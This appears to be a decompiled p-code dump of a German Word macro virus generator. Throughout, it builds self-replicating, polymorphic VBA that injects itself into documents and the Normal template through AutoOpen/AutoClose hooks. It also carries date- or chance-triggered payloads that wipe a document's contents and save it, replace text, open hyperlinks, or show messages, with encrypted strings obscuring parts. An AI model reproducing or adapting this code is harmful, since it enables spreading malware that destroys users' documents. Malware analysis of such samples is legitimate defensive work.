' 	LitStr 0x0008 "Private "
' 	Concat 
' 	Ld STR_AutoOpen 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld Start_Procedure_Name 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St Start_Proceduren 
' Line #77:
' 	EndIfBlock 
' Line #78:
' Line #79:
' 	Ld StartProcedure 
' 	MemLd AutoClose 
' 	IfBlock 
' Line #80:
' 	Ld ProcBuf 
' 	Ld STR_AutoClose 
' 	ArgsLd Procedute_hinzufügen 0x0002 
' 	Ld vbCr 
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St ProcBuf 
' Line #81:
' 	Ld Start_Proceduren 
' 	LitStr 0x0008 "Private "
' 	Concat 
' 	Ld STR_AutoClose 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld Start_Procedure_Name 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St Start_Proceduren 
' Line #82:
' 	EndIfBlock 
' Line #83:
' Line #84:
' 	LitDI2 0x0001 
' 	ArgsLd Modul14 0x0001 
' 	LitStr 0x0002 "&O"
' 	Concat 
' 	LitDI2 0x0005 
' 	Ld ProcCount 
' 	Add 
' 	ArgsLd Oct 0x0001 
' 	Concat 
' 	LitStr 0x000B ") As String"
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsSt Modul14 0x0001 
' Line #85:
' 	Ld ProcBuf 
' 	LitDI2 0x0008 
' 	ArgsSt Modul14 0x0001 
' Line #86:
' 	Ld Modul1 
' 	Ld Modul2 
' 	Ld Modul3 
' 	Ld Modul4 
' 	Ld Modul5 
' 	Ld Modul6 
' 	Ld Modul7 
' 	Ld Modul8 
' 	Ld Modul9 
' 	Ld Modul10 
' 	Ld Modul11 
' 	Ld Modul12 
' 	Ld Modul13 
' 	Ld Modul14 
' 	Ld Modul15 
' 	Ld Modul16 
' 	Ld Modul17 
' 	Ld Modul18 
' 	Ld Modul19 
' 	Ld Modul20 
' 	Ld Modul21 
' 	Ld Modul22 
' 	Ld Modul23 
' 	ArgsLd Code_Einlesen 0x0017 
' 	St VirusCodeBuffer 
' Line #87:
' Line #88:
' 	Ld VS 
' 	ArgsLd Get_Neuen_SchlüsselCode 0x0001 
' 	St NewCode 
' Line #89:
' 	Ld VirusCodeBuffer 
' 	ArgsCall BlöckeTauschen 0x0001 
' Line #90:
' 	Ld VirusCodeBuffer 
' 	Ld VS 
' 	Ld NewCode 
' 	ArgsCall Schlüssel_ändern 0x0003 
' Line #91:
' 	Ld VirusCodeBuffer 
' 	Ld VS 
' 	Ld NewCode 
' 	ArgsCall Texteinträge_ändern 0x0003 
' Line #92:
' 	Ld VirusCodeBuffer 
' 	ArgsCall Var_ändern 0x0001 
' Line #93:
' 	Ld VirusCodeBuffer 
' 	ArgsCall Sprungmarken_ändern 0x0001 
' Line #94:
' Line #95:
' 	LitStr 0x000C "Private Sub "
' 	Ld Start_Procedure_Name 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld VirusCodeBuffer 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld Start_Proceduren 
' 	Concat 
' 	St VirusCodeBuffer 
' Line #96:
' 	Ld ZielDocument 
' 	ArgsMemCall Activate 0x0000 
' Line #97:
' 	Ld VirusCodeBuffer 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #98:
' Line #99:
' 	OnError fehler2 
' Line #100:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #101:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #102:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #103:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #104:
' 	Ld FormFertig 
' 	ArgsMemCall Show 0x0000 
' Line #105:
' 	ExitSub 
' Line #106:
' Line #107:
' 	Label Fehler1 
' Line #108:
' 	LitStr 0x001A "Fehler bei der Erstellung."
' 	Ld vbCritical 
' 	LitStr 0x0006 "Fehler"
' 	ArgsCall MsgBox 0x0003 
' Line #109:
' 	ExitSub 
' Line #110:
' Line #111:
' 	Label fehler2 
' Line #112:
' 	LitStr 0x0038 "Konnte Virus erstellen aber Dokument nicht schließen !!!"
' 	Ld vbCritical 
' 	LitStr 0x0006 "Fehler"
' 	ArgsCall MsgBox 0x0003 
' Line #113:
' 	EndSub 
' Line #114:
' Line #115:
' Line #116:
' 	FuncDefn (Function Code_Einlesen(Buf As ) As String)
' Line #117:
' 	Dim 
' 	VarDefn x (As Byte)
' 	VarDefn y (As Byte)
' 	VarDefn VirusBuf (As String)
' 	VarDefn TMP (As String)
' 	VarDefn z (As Long)
' Line #118:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld Buf 
' 	FnUBound 0x0000 
' 	For 
' Line #119:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld x 
' 	ArgsLd Buf 0x0001 
' 	FnUBound 0x0000 
' 	For 
' Line #120:
' 	Ld VirusBuf 
' 	Ld y 
' 	Ld x 
' 	ArgsLd Buf 0x0001 
' 	IndexLd 0x0001 
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St VirusBuf 
' Line #121:
' 	Ld Rnd 
' 	LitOI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitOI2 0x0001 
' 	Add 
' 	LitOI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld VirusBuf 
' 	Ld vbCr 
' 	Concat 
' 	St VirusBuf 
' 	EndIf 
' Line #122:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #123:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #124:
' 	Ld CodeKopf 
' 	Ld VirusBuf 
' 	Concat 
' 	Ld CodeFuss 
' 	Concat 
' 	St Code_Einlesen 
' Line #125:
' 	EndFunc 
' Line #126:
' Line #127:
' 	FuncDefn (Function Procedute_hinzufügen(ByVal Buf As String, Bez As String) As String)
' Line #128:
' 	Ld ProcCount 
' 	LitDI2 0x0001 
' 	Add 
' 	St ProcCount 
' Line #129:
' 	Ld Buf 
' 	LitStr 0x0009 "MF0wi = ""
' 	Concat 
' 	Ld Bez 
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	Concat 
' 	LitStr 0x001B "": GoSub VXdgkhe6: Pn56mO3("
' 	Concat 
' 	LitStr 0x0002 "&O"
' 	Concat 
' 	LitDI2 0x0005 
' 	Ld ProcCount 
' 	Add 
' 	ArgsLd Oct 0x0001 
' 	Concat 
' 	LitStr 0x0009 ") = MF0wi"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St Procedute_hinzufügen 
' Line #130:
' 	EndFunc 
' Line #131:
' Line #132:
' 	FuncDefn (Sub Init_PlayLoad())
' Line #133:
' 	Ld Dat_HyperLink 
' 	MemLd OK 
' 	If 
' 	BoSImplicit 
' 	Ld Dat_HyperLink 
' 	MemLd Datum 
' 	Ld Dat_HyperLink 
' 	MemLd Zufall 
' 	ArgsLd Get_StartCode 0x0002 
' 	Ld Dat_HyperLink 
' 	ArgsLd Get_HyperLink 0x0001 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	LitDI2 0x0007 
' 	ArgsSt Modul1 0x0001 
' 	EndIf 
' Line #134:
' 	Ld Dat_TextBox 
' 	MemLd OK 
' 	If 
' 	BoSImplicit 
' 	Ld Dat_TextBox 
' 	MemLd Datum 
' 	Ld Dat_TextBox 
' 	MemLd Zufall 
' 	ArgsLd Get_StartCode 0x0002 
' 	Ld Dat_TextBox 
' 	ArgsLd Get_TextBox 0x0001 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	LitDI2 0x001A 
' 	ArgsSt Modul2 0x0001 
' 	EndIf 
' Line #135:
' 	Ld Dat_Replace 
' 	MemLd OK 
' 	If 
' 	BoSImplicit 
' 	Ld Dat_Replace 
' 	MemLd Datum 
' 	Ld Dat_Replace 
' 	MemLd Zufall 
' 	ArgsLd Get_StartCode 0x0002 
' 	Ld Dat_Replace 
' 	ArgsLd Get_Replace 0x0001 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsSt Modul4 0x0001 
' 	EndIf 
' Line #136:
' 	Ld Dat_AkivDocDel 
' 	MemLd OK 
' 	If 
' 	BoSImplicit 
' 	Ld Dat_AkivDocDel 
' 	MemLd Datum 
' 	Ld Dat_AkivDocDel 
' 	MemLd Zufall 
' 	ArgsLd Get_StartCode 0x0002 
' 	Ld Dat_AkivDocDel 
' 	ArgsLd Get_AkivDocDel 0x0001 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	LitDI2 0x0001 
' 	ArgsSt Modul5 0x0001 
' 	EndIf 
' Line #137:
' 	EndSub 
' Line #138:
' Line #139:
' 	FuncDefn (Private Function Get_TextBox(Dat As ) As String)
' Line #140:
' 	Dim 
' 	VarDefn Buf (As String)
' Line #141:
' 	LitStr 0x0014 "On Error Resume Next"
' 	Ld GET_Kommentar 
' 	Concat 
' 	St Buf 
' Line #142:
' 	Ld Buf 
' 	LitStr 0x0008 "MF0wi = "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	Ld Dat 
' 	MemLd Prompt 
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0020 ": GoSub VXdgkhe6: LS2m39 = MF0wi"
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St Buf 
' Line #143:
' 	Ld Buf 
' 	LitStr 0x0008 "MF0wi = "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	Ld Dat 
' 	MemLd Title 
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0022 ": GoSub VXdgkhe6: GL3N32Ng = MF0wi"
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St Buf 
' Line #144:
' 	Ld Buf 
' 	LitStr 0x000F "MsgBox LS2m39, "
' 	Concat 
' 	LitStr 0x0002 "&O"
' 	Concat 
' 	Ld Dat 
' 	MemLd Symbol 
' 	ArgsLd Oct 0x0001 
' 	Concat 
' 	LitStr 0x000A ", GL3N32Ng"
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St Buf 
' Line #145:
' 	Ld Buf 
' 	LitStr 0x0015 "On Error GoTo DcJ7WD5"
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St Buf 
' Line #146:
' 	Ld Buf 
' 	St Get_TextBox 
' Line #147:
' 	EndFunc 
' Line #148:
' Line #149:
' 	FuncDefn (Private Function Get_HyperLink(Dat As ) As String)
' Line #150:
' 	Dim 
' 	VarDefn Buf (As String)
' Line #151:
' 	LitStr 0x0014 "On Error Resume Next"
' 	Ld GET_Kommentar 
' 	Concat 
' 	St Buf 
' Line #152:
' 	Ld Buf 
' 	LitStr 0x0008 "MF0wi = "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	Ld Dat 
' 	MemLd Link 
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x000F ":GoSub VXdgkhe6"
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St Buf 
' Line #153:
' 	Ld Buf 
' 	LitStr 0x004F "ActiveDocument.FollowHyperlink Address:=MF0wi,NewWindow:=False,AddHistory:=True"
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St Buf 
' Line #154:
' 	Ld Buf 
' 	LitStr 0x0015 "On Error GoTo DcJ7WD5"
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St Buf 
' Line #155:
' 	Ld Buf 
' 	St Get_HyperLink 
' Line #156:
' 	EndFunc 
' Line #157:
' Line #158:
' 	FuncDefn (Private Function Get_Replace(Dat As ) As String)
' Line #159:
' 	Dim 
' 	VarDefn Buf (As String)
' Line #160:
' 	LitStr 0x0014 "On Error Resume Next"
' 	Ld GET_Kommentar 
' 	Concat 
' 	St Buf 
' Line #161:
' 	Ld Buf 
' 	LitStr 0x0008 "MF0wi = "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	Ld Dat 
' 	MemLd Orginal 
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0020 ": GoSub VXdgkhe6: LS2m39 = MF0wi"
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St Buf 
' Line #162:
' 	Ld Buf 
' 	LitStr 0x0008 "MF0wi = "
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	Ld Dat 
' 	MemLd Replace 
' 	Ld VS 
' 	ArgsLd DeCrypt 0x0002 
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0022 ": GoSub VXdgkhe6: GL3N32Ng = MF0wi"
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St Buf 
' Line #163:
' 	Ld Buf 
' 	LitStr 0x001F "Selection.HomeKey Unit:=wdStory"
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St Buf 
' Line #164:
' 	Ld Buf 
' 	LitStr 0x0013 "With Selection.Find"
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St Buf 
' Line #165:
' 	Ld Buf 
' 	LitStr 0x002E ".ClearFormatting: .Replacement.ClearFormatting"
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St Buf 
' Line #166:
' 	Ld Buf 
' 	LitStr 0x000E ".Text = LS2m39"
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St Buf 
' Line #167:
' 	Ld Buf 
' 	LitStr 0x001C ".Replacement.Text = GL3N32Ng"
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St Buf 
' Line #168:
' 	Ld Buf 
' 	LitStr 0x0060 ".Forward = True: .Wrap = wdFindContinue: .Format = False: .MatchCase = False: .MatchWholeWord = "
' 	Concat 
' 	St Buf 
' Line #169:
' 	Ld Dat 
' 	MemLd GanzesWort 
' 	IfBlock 
' Line #170:
' 	Ld Buf 
' 	LitStr 0x0020 "True: .MatchAllWordForms = False"
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St Buf 
' Line #171:
' 	ElseBlock 
' 	BoS 0x0000 
' 	Ld Buf 
' 	LitStr 0x0021 "False: .MatchAllWordForms = False"
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St Buf 
' Line #172:
' 	EndIfBlock 
' Line #173:
' 	Ld Buf 
' 	LitStr 0x0008 "End With"
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St Buf 
' Line #174:
' 	Ld Buf 
' 	LitStr 0x002C "Selection.Find.Execute Replace:=wdReplaceAll"
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St Buf 
' Line #175:
' 	Ld Buf 
' 	LitStr 0x0035 "If ActiveDocument.Path <> "" Then ActiveDocument.Save"
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St Buf 
' Line #176:
' 	Ld Buf 
' 	LitStr 0x0015 "On Error GoTo DcJ7WD5"
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St Buf 
' Line #177:
' 	Ld Buf 
' 	St Get_Replace 
' Line #178:
' 	EndFunc 
' Line #179:
' Line #180:
' 	FuncDefn (Private Function Get_AkivDocDel(Dat As ) As String)
' Line #181:
' 	Dim 
' 	VarDefn Buf (As String)
' Line #182:
' 	LitStr 0x0014 "On Error Resume Next"
' 	Ld GET_Kommentar 
' 	Concat 
' 	St Buf 
' Line #183:
' 	Ld Buf 
' 	LitStr 0x0046 "Selection.WholeStory: Selection.Delete Unit:=wdCharacter, Count:=&O1: "
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St Buf 
' Line #184:
' 	Ld Buf 
' 	LitStr 0x0035 "If ActiveDocument.Path <> "" Then ActiveDocument.Save"
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St Buf 
' Line #185:
' 	Ld Buf 
' 	LitStr 0x0015 "On Error GoTo DcJ7WD5"
' 	Concat 
' 	Ld GET_Kommentar 
' 	Concat 
' 	St Buf 
' Line #186:
' 	Ld Buf 
' 	St Get_AkivDocDel 
' Line #187:
' 	EndFunc 
' Line #188:
' Line #189:
' 	FuncDefn (Private Function Get_StartCode(Datum As , Zufall As ) As String)
' Line #190:
' 	Dim 
' 	VarDefn Buf (As String)
' Line #191:
' 	StartWithExpr 
' 	Ld Datum 
' 	With 
' Line #192:
' 	MemLdWith Auswahl 
' 	IfBlock 
' Line #193:
' 	MemLdWith JedenTag 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000C "Day(Date) = "
' 	LitStr 0x0002 "&O"
' 	Concat 
' 	MemLdWith Tag 
' 	ArgsLd Oct 0x0001 
' 	Concat 
' 	St Buf 
' 	EndIf 
' Line #194:
' 	MemLdWith JedenMonat 
' 	Not 
' 	IfBlock 
' Line #195:
' 	MemLdWith JedenTag 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "("
' 	Ld Buf 
' 	Concat 
' 	LitStr 0x0013 " And Month(Date) = "
' 	Concat 
' 	LitStr 0x0002 "&O"
' 	Concat 
' 	MemLdWith Monat 
' 	ArgsLd Oct 0x0001 
' 	Concat 
' 	LitStr 0x0001 ")"
' 	Concat 
' 	St Buf 
' 	Else 
' 	BoSImplicit 
' 	BoS 0x0000 
' 	Ld Buf 
' 	LitStr 0x000E "Month(Date) = "
' 	Concat 
' 	LitStr 0x0002 "&O"
' 	Concat 
' 	MemLdWith Monat 
' 	ArgsLd Oct 0x0001 
' 	Concat 
' 	St Buf 
' 	EndIf 
' Line #196:
' 	EndIfBlock 
' Line #197:
' 	EndIfBlock 
' Line #198:
' 	EndWith 
' Line #199:
' 	LitStr 0x0003 "If "
' 	Ld Buf 
' 	Concat 
' 	St Buf 
' Line #200:
' 	StartWithExpr 
' 	Ld Zufall 
' 	With 
' Line #201:
' 	MemLdWith Auswahl 
' 	IfBlock 
' Line #202:
' 	Ld Datum 
' 	MemLd Auswahl 
' 	If 
' 	BoSImplicit 
' 	Ld Buf 
' 	LitStr 0x0005 " And "
' 	Concat 
' 	St Buf 
' 	EndIf 
' Line #203:
' 	Ld Buf 
' 	LitStr 0x0005 "Int(("
' 	Concat 
' 	LitStr 0x0002 "&O"
' 	Concat 
' 	MemLdWith Randomize 
' 	ArgsLd Oct 0x0001 
' 	Concat 
' 	LitStr 0x0011 " * Rnd) + &O1) = "
' 	Concat 
' 	LitStr 0x0002 "&O"
' 	Concat 
' 	MemLdWith Randomize 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	ArgsLd Oct 0x0001 
' 	Concat 
' 	St Buf 
' Line #204:
' 	EndIfBlock 
' Line #205:
' 	EndWith 
' Line #206:
' 	Ld Buf 
' 	LitStr 0x0005 " Then"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St Get_StartCode 
' Line #207:
' 	EndFunc 
' Line #208:
' Line #209:
' 	FuncDefn (Public Sub Init_Module())
' Line #210:
' 	LitStr 0x0007 "SHRm7m:"
' 	Ld vbCr 
' 	Concat 
' 	St CodeKopf 
' Line #211:
' 	LitStr 0x0008 "DcJ7WD5:"
' 	Ld vbCr 
' 	Concat 
' 	LitStr 0x0008 "MStoLEX:"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St CodeFuss 
' Line #212:
' 	LitStr 0x0008 "Yny7e7C:"
' 	LitDI2 0x0000 
' 	ArgsSt Modul1 0x0001 
' Line #213:
' 	LitStr 0x0015 "On Error GoTo DcJ7WD5"
' 	LitDI2 0x0001 
' 	ArgsSt Modul1 0x0001 
' Line #214:
' 	LitStr 0x0010 "Const Fp5Gc6n = "
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0063 "Ï’ïžÐ¬¡¾€ŒóÃˆ”Êš­™°ë¶ Â³½÷«‡‚�Ñ“•à‘¤†�íÿÈ„�¸À�òèÍ´‹ì§¯ÌùËŸð¥·»¢˜ºç�›á¨õåŽø¿¦²©—ãâªƒ±êÓ¼œÇúÄŠ£ÅÁ®µ¹‰"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0002 " '"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0005 "2/1/1"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitDI2 0x0002 
' 	ArgsSt Modul1 0x0001 
' Line #215:
' 	LitStr 0x0014 "Dim QEW3NE As String"
' 	LitDI2 0x0003 
' 	ArgsSt Modul1 0x0001 
' Line #216:
' 	LitStr 0x0013 "Dim HB112LY As Long"
' 	LitDI2 0x0004 
' 	ArgsSt Modul1 0x0001 
' Line #217:
' 	LitStr 0x0015 "Dim PcDCm9n As Object"
' 	LitDI2 0x0005 
' 	ArgsSt Modul1 0x0001 
' Line #218:
' 	LitStr 0x0013 "Dim MF0wi As String"
' 	LitDI2 0x0006 
' 	ArgsSt Modul1 0x0001 
' Line #219:
' 	LitStr 0x0000 ""
' 	LitDI2 0x0007 
' 	ArgsSt Modul1 0x0001 
' Line #220:
' 	LitStr 0x000D "GoTo S02217RK"
' 	LitDI2 0x0008 
' 	ArgsSt Modul1 0x0001 
' Line #221:
' 	LitStr 0x000C "GoTo MStoLEX"
' 	LitDI2 0x0009 
' 	ArgsSt Modul1 0x0001 
' Line #222:
' 	LitStr 0x0009 "S02217RK:"
' 	LitDI2 0x0000 
' 	ArgsSt Modul2 0x0001 
' Line #223:
' 	LitStr 0x0016 "Dim U4l6O6NO As Object"
' 	LitDI2 0x0001 
' 	ArgsSt Modul2 0x0001 
' Line #224:
' 	LitStr 0x0013 "Dim BNH7J As Object"
' 	LitDI2 0x0002 
' 	ArgsSt Modul2 0x0001 
' Line #225:
' 	LitStr 0x0014 "Dim CVS3lq As Object"
' 	LitDI2 0x0003 
' 	ArgsSt Modul2 0x0001 
' Line #226:
' 	LitStr 0x0013 "Dim XMh9n6h As Byte"
' 	LitDI2 0x0004 
' 	ArgsSt Modul2 0x0001 
' Line #227:
' 	LitStr 0x0015 "Dim X01TEQM As String"
' 	LitDI2 0x0005 
' 	ArgsSt Modul2 0x0001 
' Line #228:
' 	LitStr 0x0014 "Dim RRPU1a As String"
' 	LitDI2 0x0006 
' 	ArgsSt Modul2 0x0001 
' Line #229:
' 	LitStr 0x0014 "Dim W4XM5 As Variant"
' 	LitDI2 0x0007 
' 	ArgsSt Modul2 0x0001 
' Line #230:
' 	LitStr 0x0014 "Dim T0G9Jb As String"
' 	LitDI2 0x0008 
' 	ArgsSt Modul2 0x0001 
' Line #231:
' 	LitStr 0x0016 "Dim GflIa73P As String"
' 	LitDI2 0x0009 
' 	ArgsSt Modul2 0x0001 
' Line #232:
' 	LitStr 0x0012 "Dim M16G5E As Long"
' 	LitDI2 0x000A 
' 	ArgsSt Modul2 0x0001 
' Line #233:
' 	LitStr 0x0014 "Dim JXVd3djG As Long"
' 	LitDI2 0x000B 
' 	ArgsSt Modul2 0x0001 
' Line #234:
' 	LitStr 0x0012 "Dim AM4if6 As Long"
' 	LitDI2 0x000C 
' 	ArgsSt Modul2 0x0001 
' Line #235:
' 	LitStr 0x0012 "Dim PdwD8a As Long"
' 	LitDI2 0x000D 
' 	ArgsSt Modul2 0x0001 
' Line #236:
' 	LitStr 0x0012 "Dim Uo5hL7 As Long"
' 	LitDI2 0x000E 
' 	ArgsSt Modul2 0x0001 
' Line #237:
' 	LitStr 0x0012 "Dim P7WFD4 As Long"
' 	LitDI2 0x000F 
' 	ArgsSt Modul2 0x0001 
' Line #238:
' 	LitStr 0x0014 "Dim LS2m39 As String"
' 	LitDI2 0x0010 
' 	ArgsSt Modul2 0x0001 
' Line #239:
' 	LitStr 0x0016 "Dim GL3N32Ng As String"
' 	LitDI2 0x0011 
' 	ArgsSt Modul2 0x0001 
' Line #240:
' 	LitStr 0x0014 "Dim TQ29OG As String"
' 	LitDI2 0x0012 
' 	ArgsSt Modul2 0x0001 
' Line #241:
' 	LitStr 0x0014 "Dim KFSlBy As String"
' 	LitDI2 0x0013 
' 	ArgsSt Modul2 0x0001 
' Line #242:
' 	LitStr 0x0016 "Dim YhXdXf7 As Variant"
' 	LitDI2 0x0014 
' 	ArgsSt Modul2 0x0001 
' Line #243:
' 	LitStr 0x0016 "Dim SwMgP44 As Variant"
' 	LitDI2 0x0015 
' 	ArgsSt Modul2 0x0001 
' Line #244:
' 	LitStr 0x0015 "Dim An75uj As Variant"
' 	LitDI2 0x0016 
' 	ArgsSt Modul2 0x0001 
' Line #245:
' 	LitStr 0x0013 "Dim OtN9M As String"
' 	LitDI2 0x0017 
' 	ArgsSt Modul2 0x0001 
' Line #246:
' 	LitStr 0x0016 "Dim Pn56mO3 As Variant"
' 	LitDI2 0x0018 
' 	ArgsSt Modul2 0x0001 
' Line #247:
' 	LitStr 0x000E "GoSub VvhD15Ok"
' 	LitDI2 0x0019 
' 	ArgsSt Modul2 0x0001 
' Line #248:
' 	LitStr 0x000F "Randomize Timer"
' 	LitDI2 0x001A 
' 	ArgsSt Modul2 0x0001 
' Line #249:
' 	LitStr 0x0000 ""
' 	LitDI2 0x001B 
' 	ArgsSt Modul2 0x0001 
' Line #250:
' 	LitStr 0x000B "GoTo E7swNF"
' 	LitDI2 0x001C 
' 	ArgsSt Modul2 0x0001 
' Line #251:
' 	LitStr 0x000C "GoTo MStoLEX"
' 	LitDI2 0x001D 
' 	ArgsSt Modul2 0x0001 
' Line #252:
' 	LitStr 0x0007 "J54Jq0:"
' 	LitDI2 0x0000 
' 	ArgsSt Modul3 0x0001 
' Line #253:
' 	LitStr 0x0023 "PcDCm9n.InsertLines HB112LY, QEW3NE"
' 	LitDI2 0x0001 
' 	ArgsSt Modul3 0x0001 
' Line #254:
' 	LitStr 0x0006 "Return"
' 	LitDI2 0x0002 
' 	ArgsSt Modul3 0x0001 
' Line #255:
' 	LitStr 0x000C "GoTo MStoLEX"
' 	LitDI2 0x0003 
' 	ArgsSt Modul3 0x0001 
' Line #256:
' 	LitStr 0x0007 "E7swNF:"
' 	LitDI2 0x0000 
' 	ArgsSt Modul4 0x0001 
' Line #257:
' 	LitStr 0x001C "ReDim YhXdXf7(&O3) As String"
' 	LitDI2 0x0001 
' 	ArgsSt Modul4 0x0001 
' Line #258:
' 	LitStr 0x001A "ReDim SwMgP44(&O2) As Long"
' 	LitDI2 0x0002 
' 	ArgsSt Modul4 0x0001 
' Line #259:
' 	LitStr 0x0008 "MF0wi = "
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x003C "‡ÙªÇ�àîýÁÀ¬ŽÉ×‚ÓãÜì¸ÙÆ¶ÄÜ…ÎÛÏæ²áú“þÂòÁº–¦àîÏ³Ñ±�¿Æî‚Óù©‹¸öŸË"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0024 ": GoSub VXdgkhe6: YhXdXf7(0) = MF0wi"
' 	Concat 
' 	LitDI2 0x0003 
' 	ArgsSt Modul4 0x0001 
' Line #260:
' 	LitStr 0x0008 "MF0wi = "
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0012 "œâ€ý»úÄÌóåœ­Æá§øÈë"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0026 ": GoSub VXdgkhe6: YhXdXf7(&O1) = MF0wi"
' 	Concat 
' 	LitDI2 0x0004 
' 	ArgsSt Modul4 0x0001 
' Line #261:
' 	LitStr 0x0008 "MF0wi = "
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x000F "�÷ˆ÷£ØÄÌåè¼´æñ¸"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0026 ": GoSub VXdgkhe6: YhXdXf7(&O2) = MF0wi"
' 	Concat 
' 	LitDI2 0x0005 
' 	ArgsSt Modul4 0x0001 
' Line #262:
' 	LitStr 0x0008 "MF0wi = "
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0016 "�÷ˆ÷£ØÄÌåè¼±ïõ¤ó×øÄ‚ÙÎ"
' 	Concat 
' 	LitStr 0x0001 """
' 	Concat 
' 	LitStr 0x0026 ": GoSub VXdgkhe6: YhXdXf7(&O3) = MF0wi"
' 	Concat 
' 	LitDI2 0x0006 
' 	ArgsSt Modul4 0x0001 
' Line #263:
' 	LitStr 0x0044 "LS2m39 = System.PrivateProfileString("", YhXdXf7(&O0), YhXdXf7(&O1))"
' 	LitDI2 0x0007 
